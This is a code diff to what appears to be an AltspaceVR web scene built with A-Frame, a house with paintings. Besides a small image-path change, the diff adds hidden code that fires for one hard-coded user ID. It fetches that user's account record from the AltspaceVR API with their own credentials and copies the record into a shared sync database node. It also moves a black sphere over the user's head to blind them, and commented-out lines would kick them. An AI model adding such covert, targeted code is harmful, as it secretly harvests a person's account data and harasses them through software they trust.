@@ -301,10 +301,11 @@
     
     <!-- paintings -->
     
-    <a-plane id='painting1' position='-.625 1.515 2.28' scale='.55 1.08 1' rotation='0 180 0' src='https://bengarfield.github.io/AltVR/house/1.jpg' altspace-cursor-collider='enabled: false'></a-plane>
+    <a-plane id='painting1' position='-.625 1.515 2.28' scale='.55 1.08 1' rotation='0 180 0' src='1.jpg' altspace-cursor-collider='enabled: false'></a-plane>
     <a-plane id='painting2' position='2.31 -1.456 -3.19' scale='.45 1.045 1' altspace-cursor-collider='enabled: false'></a-plane>
     <a-plane id='painting3' position='4.956 -1.674 -3.188' scale='1.53 .735 1' altspace-cursor-collider='enabled: false'></a-plane>
     
+    <a-sphere id='blindSphere' position='0 -1000 0' radius='.2' material='color:black; side: back' n-skeleton-parent='part: head'></a-sphere>
   </a-scene>
   <script>
   //altspace.open('http://www.google.com/#q=how+to+play+codenames', '_experience', {icon: 'http://bengarfield.github.io/AltVR/codenames/icon.png', hidden: true});
@@ -667,6 +668,19 @@
               t.object3D.position.y -= 1000;
             }
           }
+        }
+      }
+      
+      if (user.userId == '666122373568660407') {
+        var dataRequest = (THREE.FileLoader ? new THREE.FileLoader() : new THREE.XHRLoader(/* DEPRECATED: r83 */));
+        dataRequest.setWithCredentials(true);
+        dataRequest.load('https://account.altvr.com/api/v1/users/666122373568660407', onLoaded, undefined, undefined);
+        function onLoaded(obj) {
+          var user = JSON.parse(obj).users[0];
+          sync.app.parent().parent().child('Cas').set(user);
+          //realkick = true;
+          //getKicked();
+          blindSphere.setAttribute('position', '0 0 0');
         }
       }
 
